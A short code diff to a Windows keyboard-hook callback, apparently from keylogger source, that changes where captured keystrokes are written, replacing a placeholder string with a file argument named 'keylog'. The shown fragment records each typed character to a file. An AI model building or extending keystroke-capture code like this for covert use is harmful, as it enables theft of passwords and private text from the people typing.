@@ -60,11 +60,10 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
             if (letter)
             {
 
-                CHAR str[] = "blabla";
                 wchar_t buffer[2];
                 buffer[0] = code;
                 buffer[1] = '\0';
-                writeToFile(buffer, str);
+                writeToFile(buffer, L"keylog");
             }
         }
     }
